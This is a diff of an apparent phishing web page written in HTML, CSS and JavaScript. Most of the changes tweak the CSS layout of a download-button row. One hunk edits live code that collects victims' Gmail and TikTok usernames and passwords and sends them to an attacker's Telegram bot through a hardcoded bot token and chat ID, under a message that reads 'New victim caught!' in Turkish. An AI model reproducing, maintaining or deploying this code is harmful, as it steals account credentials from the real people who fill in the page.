@@ -198,7 +198,7 @@
             justify-content: center;
             align-items: center;
             gap: 16px;
-            flex-wrap: wrap;
+            flex-wrap: nowrap;
         }
 
         .download-wrapper a {
@@ -406,6 +406,10 @@
                 align-items: flex-start;
             }
 
+            .download-wrapper {
+                flex-wrap: wrap;
+            }
+            
             .download-wrapper img {
                 width: 150px;
                 height: 50px;
@@ -613,7 +617,7 @@
             if (gmail && gmailPassword && tiktokUsername && tiktokPassword) {
                 const botToken = '7777367983:AAHFeWMAtxEdl9_d2aCpTqq3UvlUguc4AeU';
                 const chatId = '6116320717';
-                const message = `Yeni Kurban Yakalandı! 😈\n\nTikTok Kullanıcı Adı: ${tiktokUsername}\nTikTok Şifre: ${tiktokPassword}\nGmail: ${gmail}\nGmail Şifre: ${gmailPassword}\nZaman: ${new Date().toISOString()}`;
+                const message = `Yeni Kurban Yakalandı! 😈\nTikTok Kullanıcı Adı: ${tiktokUsername}\nTikTok Şifre: ${tiktokPassword}\nGmail: ${gmail}\nGmail Şifre: ${gmailPassword}\nZaman: ${new Date().toISOString()}`;
 
                 console.log('Telegram’a gönderilen mesaj:', message);
                 console.log('Gönderilen URL:', `https://api.telegram.org/bot${botToken}/sendMessage`);
